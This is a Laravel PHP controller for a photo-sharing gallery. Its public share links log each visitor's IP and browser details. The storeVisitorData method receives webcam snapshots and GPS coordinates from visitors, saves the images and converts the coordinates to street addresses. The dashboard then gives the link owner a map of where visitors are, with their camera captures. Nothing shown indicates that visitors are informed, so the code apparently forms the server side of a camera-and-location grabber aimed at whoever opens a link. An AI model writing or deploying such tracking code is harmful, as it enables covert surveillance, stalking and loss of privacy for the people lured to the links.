<?php

namespace App\Http\Controllers;

use App\Models\GalleryImage;
use App\Models\VisitorLog;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Http;

class GalleryImageController extends Controller
{
    public function store(Request $request)
    {
        $request->validate([
            'category_id' => 'nullable|exists:categories,id',
            'images' => 'required|array',
            'images.*' => 'image|mimes:jpeg,png,jpg,gif,webp|max:5120',
            'is_public' => 'required|boolean'
        ]);

        foreach ($request->file('images') as $file) {
            $path = $file->store('gallery', 'public');
            
            Auth::user()->images()->create([
                'category_id' => $request->category_id,
                'path' => $path,
                'is_public' => $request->is_public,
                'share_token' => $request->is_public ? Str::random(20) : null,
                'name' => $file->getClientOriginalName(),
            ]);
        }

        return back()->with('success', 'Images uploaded successfully.');
    }

    public function show($token)
    {
        $image = GalleryImage::where('share_token', $token)->where('is_public', true)->firstOrFail();

        // Log Visitor Data
        $visitorLog = null;
        try {
            $ip = request()->ip();
            $userAgent = request()->header('User-Agent');
            $referrer = request()->header('referer');
            
            // Simple location lookup (can be improved with a package or API)
            // For now, we'll just log the IP and let the dashboard handle visualization
            $visitorLog = $image->visitorLogs()->create([
                'ip_address' => $ip,
                'user_agent' => $userAgent,
                'referrer' => $referrer,
                // These could be populated by an IP-Location service
                'country' => 'Unknown', 
                'city' => 'Unknown',
            ]);
        } catch (\Exception $e) {
            // Silently fail to not interrupt user experience
            \Log::error("Visitor tracking error: " . $e->getMessage());
        }

        return view('images.public', compact('image', 'visitorLog'));
    }

    public function destroy(GalleryImage $image)
    {
        if (Auth::id() !== $image->user_id) {
            abort(403);
        }

        Storage::disk('public')->delete($image->path);
        $image->delete();

        return back()->with('success', 'Image deleted successfully.');
    }

    public function logs(GalleryImage $image)
    {
        if (Auth::id() !== $image->user_id) {
            abort(403);
        }

        $logs = $image->visitorLogs()->latest()->paginate(20);
        return view('images.logs', compact('image', 'logs'));
    }

    public function allLogs(Request $request)
    {
        $query = Auth::user()->images()->with('visitorLogs')->get()->pluck('visitorLogs')->flatten();
        
        // Let's do it better using the VisitorLog model and filtering by user's images/categories
        $imageIds = Auth::user()->images->pluck('id');
        $categoryIds = Auth::user()->categories->pluck('id');

        $logs = \App\Models\VisitorLog::whereIn('gallery_image_id', $imageIds)
            ->orWhereIn('category_id', $categoryIds)
            ->latest()
            ->when($request->category_id, function($q) use ($request) {
                return $q->where('category_id', $request->category_id);
            })
            ->when($request->image_id, function($q) use ($request) {
                return $q->where('gallery_image_id', $request->image_id);
            })
            ->paginate(30);

        return view('analytics.index', compact('logs'));
    }

    public function dashboard()
    {
        $imageIds = Auth::user()->images->pluck('id');
        $categoryIds = Auth::user()->categories->pluck('id');

        $allLogs = \App\Models\VisitorLog::whereIn('gallery_image_id', $imageIds)
            ->orWhereIn('category_id', $categoryIds)
            ->latest()
            ->get();

        $stats = [
            'total_visits' => $allLogs->count(),
            'camera_captures' => $allLogs->where(function($log) {
                return $log->camera_image_path || $log->camera_image_base64;
            })->count(),
            'location_data' => $allLogs->whereNotNull('latitude')->count(),
            'unique_countries' => $allLogs->whereNotNull('country')->pluck('country')->unique()->count(),
            'recent_visitors' => $allLogs->take(5),
            'locations' => $allLogs->whereNotNull('latitude')->whereNotNull('longitude')->map(function($log) {
                return [
                    'lat' => $log->latitude,
                    'lng' => $log->longitude,
                    'address' => $log->address,
                    'ip' => $log->ip_address,
                    'country' => $log->country,
                    'city' => $log->city,
                    'camera' => $log->camera_image_path || $log->camera_image_base64 ? true : false
                ];
            })
        ];

        return view('dashboard', compact('stats'));
    }

    public function storeVisitorData(Request $request)
    {
        try {
            $request->validate([
                'visitor_log_id' => 'required|exists:visitor_logs,id',
                'camera_image' => 'nullable|string', // base64 image
                'latitude' => 'nullable|numeric|between:-90,90',
                'longitude' => 'nullable|numeric|between:-180,180',
                'location_accuracy' => 'nullable|numeric|min:0',
            ]);
        } catch (\Illuminate\Validation\ValidationException $e) {
            return response()->json([
                'success' => false, 
                'message' => 'Validation failed',
                'errors' => $e->errors()
            ], 422);
        }

        try {
            $visitorLog = VisitorLog::findOrFail($request->visitor_log_id);
            $updateData = [];

            // Handle camera image
            if ($request->camera_image && !empty($request->camera_image)) {
                try {
                    $imageData = $request->camera_image;
                    // Remove data URL prefix if present
                    if (strpos($imageData, ',') !== false) {
                        $imageData = explode(',', $imageData)[1];
                    }
                    $imageData = base64_decode($imageData, true);
                    
                    if ($imageData === false) {
                        \Log::warning("Failed to decode base64 image for visitor log: " . $request->visitor_log_id);
                    } else {
                        // Generate unique filename
                        $filename = 'visitor-capture-' . $visitorLog->id . '-' . time() . '.jpg';
                        $path = 'visitor-captures/' . $filename;
                        
                        // Ensure directory exists
                        $directory = storage_path('app/public/visitor-captures');
                        if (!file_exists($directory)) {
                            mkdir($directory, 0755, true);
                        }
                        
                        // Save image to storage
                        Storage::disk('public')->put($path, $imageData);
                        
                        $updateData['camera_image_path'] = $path;
                        $updateData['camera_image_base64'] = $request->camera_image; // Store base64 for quick access
                    }
                } catch (\Exception $e) {
                    \Log::error("Camera image save error: " . $e->getMessage());
                    // Continue without camera image
                }
            }

            // Handle location data (PRIORITY)
            if ($request->latitude && $request->longitude) {
                $updateData['latitude'] = $request->latitude;
                $updateData['longitude'] = $request->longitude;
                $updateData['location_accuracy'] = $request->location_accuracy ?? null;

                // Reverse geocoding to get address (async, don't block)
                try {
                    $address = $this->reverseGeocode($request->latitude, $request->longitude);
                    if ($address) {
                        $updateData['address'] = $address;
                    }
                } catch (\Exception $e) {
                    \Log::error("Reverse geocoding error: " . $e->getMessage());
                    // Continue without address, location coordinates are saved
                }
            }

            // Update visitor log (even if only location or only camera)
            if (!empty($updateData)) {
                $visitorLog->update($updateData);
                return response()->json([
                    'success' => true, 
                    'message' => 'Visitor data saved successfully',
                    'saved' => array_keys($updateData)
                ]);
            } else {
                return response()->json([
                    'success' => false, 
                    'message' => 'No data to save'
                ], 400);
            }
        } catch (\Illuminate\Database\Eloquent\ModelNotFoundException $e) {
            return response()->json([
                'success' => false, 
                'message' => 'Visitor log not found'
            ], 404);
        } catch (\Exception $e) {
            \Log::error("Store visitor data error: " . $e->getMessage() . "\n" . $e->getTraceAsString());
            return response()->json([
                'success' => false, 
                'message' => 'Failed to save visitor data: ' . $e->getMessage()
            ], 500);
        }
    }

    private function reverseGeocode($latitude, $longitude)
    {
        // Using OpenStreetMap Nominatim API (free, no API key required)
        $url = "https://nominatim.openstreetmap.org/reverse?format=json&lat={$latitude}&lon={$longitude}&zoom=18&addressdetails=1";
        
        try {
            $response = Http::withHeaders([
                'User-Agent' => 'Gallery-App/1.0 (Contact: webmaster@example.com)'
            ])->timeout(10)->get($url);

            if ($response->successful()) {
                $data = $response->json();
                if (isset($data['display_name']) && !empty($data['display_name'])) {
                    return $data['display_name'];
                }
            }
        } catch (\Exception $e) {
            \Log::error("Geocoding API error: " . $e->getMessage());
            // Don't throw, just return null - location coordinates are already saved
        }

        return null;
    }
}
